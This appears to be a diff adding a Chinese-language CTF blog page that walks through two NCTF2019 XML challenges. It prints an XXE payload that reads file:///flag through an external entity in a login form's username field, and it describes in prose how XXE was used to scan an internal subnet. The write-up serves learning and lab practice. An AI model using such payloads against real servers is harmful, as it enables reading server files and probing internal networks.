@@ -1,0 +1,52 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CTF | blog</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="blog" type="application/atom+xml">
+</head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a><a href="/schedule/">Synopsis</a></nav></header><main style="flex-direction: row-reverse"><article><div id="post-bg"><div id="post-title"><h1>CTF</h1><hr></div><div id="post-content"><h3 id="XML-CTF"><a href="#XML-CTF" class="headerlink" title="XML CTF"></a>XML CTF</h3><h4 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h4><ul>
+<li>类似与之前做的XXE靶场，给了一个登录框</li>
+</ul>
+<p><img src="/2021/09/06/CTF/QQ%E6%88%AA%E5%9B%BE20210906165340.png" alt="QQ截图20210906165340"></p>
+<ul>
+<li>老方法，随便输入账号密码，bp抓包，查看是否存在XML实体</li>
+</ul>
+<p><img src="/2021/09/06/CTF/QQ%E6%88%AA%E5%9B%BE20210906170103.png" alt="QQ截图20210906170103"></p>
+<ul>
+<li>存在外部实体，进行恶意构造</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>成功获取flag</li>
+</ul>
+<p><img src="/2021/09/06/CTF/QQ%E6%88%AA%E5%9B%BE20210906170240.png" alt="QQ截图20210906170240"></p>
+<h4 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h4><ul>
+<li>按照上述思路对该题进行操作，发现没能获取flag，反而出现了报错</li>
+</ul>
+<p><img src="/2021/09/06/CTF/QQ%E6%88%AA%E5%9B%BE20210906170548.png" alt="QQ截图20210906170548"></p>
+<ul>
+<li>看了一下其他大佬的blog，发现可以用XML构造恶意实体可以扫描内网存活端口</li>
+</ul>
+<p><img src="/2021/09/06/CTF/QQ%E6%88%AA%E5%9B%BE20210906170952.png" alt="QQ截图20210906170952"></p>
+<ul>
+<li>访问10.0.197.2后发现警告</li>
+</ul>
+<p><img src="/2021/09/06/CTF/QQ%E6%88%AA%E5%9B%BE20210906182608.png" alt="QQ截图20210906182608"></p>
+<ul>
+<li>用bp爆破爬虫其c段，获取可访问的IP</li>
+</ul>
+<p><img src="/2021/09/06/CTF/QQ%E6%88%AA%E5%9B%BE20210906183121.png" alt="QQ截图20210906183121"></p>
+<ul>
+<li>重新构造外部实体，获取flag</li>
+</ul>
+<div id="paginator"></div></div><div id="post-footer"><hr><a href="/2021/08/27/SSRF/">SSRF Next →</a><hr></div><div id="bottom-btn"><a id="to-index" href="#post-index" title="index">≡</a><a id="to-top" href="#post-title" title="to top">∧</a></div><div id="Valine"></div><script>new Valine({
+ el: '#Valine'
+ , appId: ''
+ , appKey: ''
+ , placeholder: '此条评论委托企鹅物流发送'
+})</script></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/"> Dr.Mr.Li</a></h1><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">31</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">17</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">6</span></div></section></div><div id="aside-block"></div><footer style="text-align: right"><nobr><span class="text-title">©</span><span class="text-content">1970 to 2020</span></nobr><wbr><nobr><span class="text-title">ICP</span><span class="text-content">——备案号——</span></nobr><wbr><wbr><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script></body></html>
